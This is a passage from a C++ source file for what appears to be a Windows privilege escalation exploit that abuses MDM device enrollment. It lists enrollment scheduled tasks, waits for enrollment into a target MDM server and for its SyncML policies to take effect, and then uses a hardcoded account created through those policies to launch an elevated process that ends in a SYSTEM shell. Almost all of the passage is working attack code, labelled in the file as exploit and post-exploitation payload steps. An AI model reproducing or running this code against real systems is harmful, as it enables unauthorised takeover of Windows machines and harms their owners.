  enrollment_tasks.push_back(task_prefix + L"Passport for Work alert created by enrollment client");
  enrollment_tasks.push_back(task_prefix + L"Provisioning initiated session");
  enrollment_tasks.push_back(task_prefix + L"Schedule #1 created by enrollment client");
  enrollment_tasks.push_back(task_prefix + L"Schedule #2 created by enrollment client");
  enrollment_tasks.push_back(task_prefix + L"Schedule #3 created by enrollment client");
  enrollment_tasks.push_back(task_prefix + L"Schedule created by enrollment client for renewal of certificate warning");
  enrollment_tasks.push_back(task_prefix + L"Schedule to run OMADMClient by client");
  enrollment_tasks.push_back(task_prefix + L"Schedule to run OMADMClient by server");
  enrollment_tasks.push_back(task_prefix + L"Win10 S Mode event listener created by enrollment client");
  enrollment_tasks.push_back(task_prefix + L"Wsc Startup event listener created by enrollment client");
  enrollment_tasks.push_back(task_prefix + L"Login Schedule created by enrollment client"); 
  enrollment_tasks.push_back(task_prefix + L"PushLaunch");
  enrollment_tasks.push_back(task_prefix + L"PushRenewal");
}

// It returns the list of all of the enrollment tasks
bool GetListOfEnrollmentTasks(TStrings& enrollment_tasks) {

  TStrings enrollment_ids;
  if (GetEnrollmentIDs(enrollment_ids)) {
    for (auto enrollment_id : enrollment_ids) {
      GetListOfEnrollmentTasksByEnrollmentID(enrollment_id, enrollment_tasks);
    }
  }

  if (enrollment_tasks.empty()) {
    return false;
  }

  return true;
}

// It just dummy wait for some time to allow SyncML policies to be enforced
// This should be improved
void BlockWaitForMDMPolicyEnforcement() {
  Sleep(2000);
}

// It executes the post exploitation actions after a successfull MDM device enrollment
bool ExecutePostExploitationPayload(bool is_enroll_only_mdm_requested, const std::wstring& target_exploit) {

  // getting current executable path
  std::wstring executable_path;
  if (!GetCurrentExecutablePath(executable_path)) {
    wprintf(L"[-] There was a problem retrieving the path to the current executable\n");
    return false;
  }

  wprintf(L"[+] Wait for device to be enrolled\n");
  if (!WaitUntilDeviceIsMDMEnrolled()) {
    wprintf(L"[-] There was a problem enrolling device into MDM server\n");
    return false;
  }

  wprintf(L"[+] Device was enrolled into target MDM server!\n");

  wprintf(L"[+] Now waiting for SyncML policies to be enforced\n");
  BlockWaitForMDMPolicyEnforcement();

  if (is_enroll_only_mdm_requested) {
    wprintf(L"[+] Exploit finished successfully. MDM SyncML commands can now be enforced into the device!\n");
    return true;
  }
  else {
    wprintf(L"[+] Creating privileged process to run privileged payload\n");

    //Target command line for elevated admin process
    std::wstring target_cmdline;
    target_cmdline.append(executable_path);
    target_cmdline.append(L" ");
    target_cmdline.append(exploit_argument);
    target_cmdline.append(L" ");
    target_cmdline.append(target_exploit);

    //This user is created during MDM policy enforcement after device enrollment
    std::wstring target_exploit_username = L"testexp";
    std::wstring target_exploit_password = L"testpass";

    // Elevated process will end up launching cmd as SYSTEM
    if (!CreateElevatedProcessFromMediumIL(target_cmdline, target_exploit_username, target_exploit_password)) {
      wprintf(L"[-] There was a problem executing privileged payload!\n");
      return false;
    }
    else {
      wprintf(L"[+] Exploit privileged payload executed successfully! MDM SyncML commands can now be enforced to the device\n");
      return true;
    }
  }

  return false;
}


// It returns the running username
std::wstring GetRunningUsername() {
  std::wstring ret;
  wchar_t username[MAX_PATH + 1] = { 0 };
  DWORD username_len = MAX_PATH;
  if (GetUserNameW(username, &username_len)) {
    ret.assign(username);
  }

  return ret;
}

// It prints the input HRESULT value
// TODO: Add programmatic description
HRESULT PrintError(HRESULT hr) {
  wprintf(L"[-] Operation failed with error 0x%X\n", (unsigned int)hr);
  return hr;
}
